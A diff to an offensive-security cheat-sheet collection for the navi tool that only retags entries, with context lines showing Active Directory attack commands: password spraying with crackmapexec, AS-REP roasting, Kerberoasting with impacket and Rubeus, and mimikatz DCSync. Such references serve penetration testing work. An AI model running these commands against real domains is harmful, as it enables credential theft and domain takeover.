@@ -1,5 +1,5 @@
 % sealldev, crackmapexec, ad auth attacks, password attacks
-@ windows-variables
+@ sealldev, windows-variables
 ; From https://github.com/sealldeveloper/navi-cheats
 ; Written by raffaele-99
 
@@ -7,7 +7,7 @@
 crackmapexec smb <host_address> -u <username_or_userlist> -p '<password>' -d <domain> --continue-on-success
 
 % sealldev, impacket, ad auth attacks, as-rep roasting
-@ windows-variables
+@ sealldev, windows-variables
 ; From https://github.com/sealldeveloper/navi-cheats
 ; Written by raffaele-99
 
@@ -15,7 +15,7 @@ crackmapexec smb <host_address> -u <username_or_userlist> -p '<password>' -d <do
 impacket-GetNPUsers -dc-ip <dc_ip> -request -outputfile hashes.asreproast <domain>/<username>
 
 % sealldev, powerview, ad auth attacks, as-rep roasting
-@ windows-variables
+@ sealldev, windows-variables
 ; From https://github.com/sealldeveloper/navi-cheats
 ; Written by raffaele-99
 
@@ -23,7 +23,7 @@ impacket-GetNPUsers -dc-ip <dc_ip> -request -outputfile hashes.asreproast <domai
 Get-DomainUser -PreauthNotRequired
 
 % sealldev, rubeus, ad auth attacks, kerberoasting
-@ windows-variables
+@ sealldev, windows-variables
 ; From https://github.com/sealldeveloper/navi-cheats
 ; Written by raffaele-99
 
@@ -31,7 +31,7 @@ Get-DomainUser -PreauthNotRequired
 .\Rubeus.exe kerberoast /outfile:<OUTFILE>
 
 % sealldev, impacket, ad auth attacks, kerberoasting
-@ windows-variables
+@ sealldev, windows-variables
 ; From https://github.com/sealldeveloper/navi-cheats
 ; Written by raffaele-99
 
@@ -50,7 +50,7 @@ sudo impacket-GetUserSPNs -request -dc-ip <dc_ip> <domain>/<username>
 ;  • Administrators
 
 % sealldev, mimikatz, ad auth attacks, dcsync
-@ windows-variables
+@ sealldev, windows-variables
 ; From https://github.com/sealldeveloper/navi-cheats
 ; Written by raffaele-99
 
@@ -59,7 +59,7 @@ sudo impacket-GetUserSPNs -request -dc-ip <dc_ip> <domain>/<username>
 lsadump::dcsync /user:<domain>/<username>
 
 % sealldev, impacket, ad auth attacks, dcsync
-@ windows-variables
+@ sealldev, windows-variables
 ; From https://github.com/sealldeveloper/navi-cheats
 ; Written by raffaele-99
 
